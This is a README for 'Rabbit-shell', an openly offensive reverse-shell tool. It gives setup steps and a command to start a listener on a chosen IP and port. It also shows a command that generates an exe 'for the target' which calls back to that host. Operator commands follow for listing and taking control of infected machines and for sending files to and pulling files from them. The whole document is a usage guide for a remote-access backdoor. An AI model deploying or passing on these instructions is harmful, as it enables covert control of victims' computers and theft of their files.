# Rabbit-shell

###### Rabbit shell reverse shell tool.





##  Installation.

```bash
git clone https://github.com/greedalbadi/rabbit-shell.git
cd rabbit-shell
pip install -r requirements.txt
```







## Run server and start listening.

```bash
python rabbit.py --server -host 192.168.0.111 -port 9999
```

> - --server is args container
> - -host is server or device ip address
> - -port is wich port you'll be listening to





## Generate exe for the target.

```bash
python rabbit.py --client -host 192.168.0.111 -port 9999
```

> - --client is args container
> - -host is server or device ip address
> - -port is wich port you'll be listening to

###### This will generate an exe inside dist directory.



## Commands to use from server side.



### To request server information.

```bash
>: server
```



### To list all clients.

```bash
>: list
```



### To set and controll a client device by client use number from the list.

```
>: set 0
```



### Quit client session.

```bash
>: quit
```



### Send file to client.

```bash
>: file:filename
```



### Request file from client.

```bash
reqfile:filename
```











made with depression <3

by [@greedalbadi](https://www.instagram.com/greedalbadi/)

